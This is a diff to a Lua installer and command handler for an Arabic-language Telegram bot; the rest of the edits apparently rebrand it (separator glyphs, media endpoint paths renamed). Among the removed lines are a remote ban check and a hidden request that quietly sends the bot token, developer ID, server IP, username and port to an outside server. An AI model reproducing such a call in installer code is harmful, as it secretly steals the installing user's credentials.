@@ -24,22 +24,12 @@ if not DevAbs:get(Server.."IdWaTaN2") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN2&Info&Id="..DevId)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-os.execute('lua WaTaN2.lua') 
-end ---ifBn
-if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevAbs:set(Server.."IdWaTaN2",DevId) 
-end ---ifok
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
-end
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+end 
 os.execute('lua WaTaN2.lua') 
-end
 end 
 if not DevAbs:get(Server.."TokenWaTaN2") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -47,16 +37,16 @@ local TokenBot = io.read()
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
 DevAbs:set(Server.."TokenWaTaN2",TokenBot) 
 end  
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
 os.execute('lua WaTaN2.lua') 
-end
+end 
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -76,7 +66,6 @@ WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -85,15 +74,15 @@ token="]]..DevAbs:get(Server.."TokenWaTaN2")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
 ./tg -s ./WaTaN2.lua -p PROFILE --bot=$token
@@ -128,7 +117,7 @@ local config = loadfile("./config.lua")()
 return config 
 end  
 Load_WaTaN2() 
-print("\27[36m"..[[                                        
+print("\27[36m"..[[                                           
 --------------------------------------------
 |          ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗    |
 |          ║║║║║║     ║╔╗╔╗║     ║║╚╗║║    |
@@ -9143,7 +9132,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:gif:Abs'..msg.chat_id_,true)  
 end
 if text == "متحركه" or text == "↫ متحركه ✯" and not DevAbs:get(WaTaN2..'Abs:gif:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/animation.php')
+data,res = https.request('https://ccccxcc.ml/David/animation.php')
 if res == 200 then
 animation = json:decode(data)
 if animation.Info == true then
@@ -9169,7 +9158,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:memz:Abs'..msg.chat_id_,true)  
 end
 if text == "ميمز" or text == "↫ ميمز ✯" and not DevAbs:get(WaTaN2..'Abs:memz:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/memz.php')
+data,res = https.request('https://ccccxcc.ml/David/memz.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9221,7 +9210,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:mp3:Abs'..msg.chat_id_,true)  
 end
 if text == "اغنيه" or text == "↫ اغنيه ✯" or text == "اغاني" and not DevAbs:get(WaTaN2..'Abs:mp3:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/mp3.php')
+data,res = https.request('https://ccccxcc.ml/David/mp3.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9247,7 +9236,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Remix:Abs'..msg.chat_id_,true)  
 end
 if text == "ريمكس" or text == "↫ ريمكس ✯" and not DevAbs:get(WaTaN2..'Abs:Remix:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/Remix.php')
+data,res = https.request('https://ccccxcc.ml/David/Remix.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9273,7 +9262,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Photo:Abs'..msg.chat_id_,true)  
 end
 if text == "صوره" or text == "↫ صوره ✯" and not DevAbs:get(WaTaN2..'Abs:Photo:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/Photo.php')
+data,res = https.request('https://ccccxcc.ml/David/Photo.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9299,7 +9288,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Anime:Abs'..msg.chat_id_,true)  
 end
 if text == "انمي" or text == "↫ انمي ✯" and not DevAbs:get(WaTaN2..'Abs:Anime:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/Anime.php')
+data,res = https.request('https://ccccxcc.ml/David/Anime.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9325,7 +9314,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Movies:Abs'..msg.chat_id_,true)  
 end
 if text == "فلم" or text == "↫ فلم ✯" and not DevAbs:get(WaTaN2..'Abs:Movies:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/Movies.php')
+data,res = https.request('https://ccccxcc.ml/David/Movies.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9351,7 +9340,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Series:Abs'..msg.chat_id_,true)  
 end
 if text == "مسلسل" or text == "↫ مسلسل ✯" and not DevAbs:get(WaTaN2..'Abs:Series:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/WaTaN2/Series.php')
+data,res = https.request('https://ccccxcc.ml/David/Series.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
